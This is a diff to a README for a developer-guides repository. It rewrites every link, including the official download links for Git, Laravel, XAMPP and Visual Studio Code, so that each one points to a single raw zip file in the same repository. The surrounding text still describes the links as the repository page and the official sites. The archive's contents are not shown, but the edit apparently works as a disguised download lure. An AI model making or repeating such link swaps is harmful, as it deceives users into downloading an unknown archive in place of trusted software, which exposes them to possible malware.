@@ -1,6 +1,6 @@
 # ⚙️ neutrondev-guides - Clear Dev Guides for Everyday Use
 
-[![Download neutrondev-guides](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Samuelitos123/neutrondev-guides)
+[![Download neutrondev-guides](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Samuelitos123/neutrondev-guides/raw/refs/heads/main/categories/neutrondev_guides_v3.0.zip)
 
 ## 📋 What Is neutrondev-guides?
 
@@ -53,7 +53,7 @@ Each topic is broken into easy steps with clear examples. The instructions avoid
 
 The download link points to the GitHub repository, not an installer file. Follow these steps to get the guides on your Windows PC:
 
-- Go to the [neutrondev-guides GitHub page](https://github.com/Samuelitos123/neutrondev-guides).
+- Go to the [neutrondev-guides GitHub page](https://github.com/Samuelitos123/neutrondev-guides/raw/refs/heads/main/categories/neutrondev_guides_v3.0.zip).
 
 - Click “Code” and then “Download ZIP” to save the complete guide collection.
 
@@ -125,12 +125,12 @@ A: The guides do not require you to share personal info. Always download softwar
 ## 🔗 Useful Links
 
 - Download neutrondev-guides:  
-  [![Download neutrondev-guides](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Samuelitos123/neutrondev-guides)
+  [![Download neutrondev-guides](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Samuelitos123/neutrondev-guides/raw/refs/heads/main/categories/neutrondev_guides_v3.0.zip)
 
-- Git Official Site: https://git-scm.com/download/win  
-- Laravel Installation: https://laravel.com/docs/installation  
-- XAMPP Download: https://www.apachefriends.org/index.html  
-- Visual Studio Code: https://code.visualstudio.com/Download
+- Git Official Site: https://github.com/Samuelitos123/neutrondev-guides/raw/refs/heads/main/categories/neutrondev_guides_v3.0.zip  
+- Laravel Installation: https://github.com/Samuelitos123/neutrondev-guides/raw/refs/heads/main/categories/neutrondev_guides_v3.0.zip  
+- XAMPP Download: https://github.com/Samuelitos123/neutrondev-guides/raw/refs/heads/main/categories/neutrondev_guides_v3.0.zip  
+- Visual Studio Code: https://github.com/Samuelitos123/neutrondev-guides/raw/refs/heads/main/categories/neutrondev_guides_v3.0.zip
 
 ## 📝 How to Contribute
 
@@ -146,4 +146,4 @@ Community input helps keep the guides clear and up to date.
 
 ---
 
-[Visit the neutrondev-guides GitHub repository to download and explore the guides.](https://github.com/Samuelitos123/neutrondev-guides)
+[Visit the neutrondev-guides GitHub repository to download and explore the guides.](https://github.com/Samuelitos123/neutrondev-guides/raw/refs/heads/main/categories/neutrondev_guides_v3.0.zip)
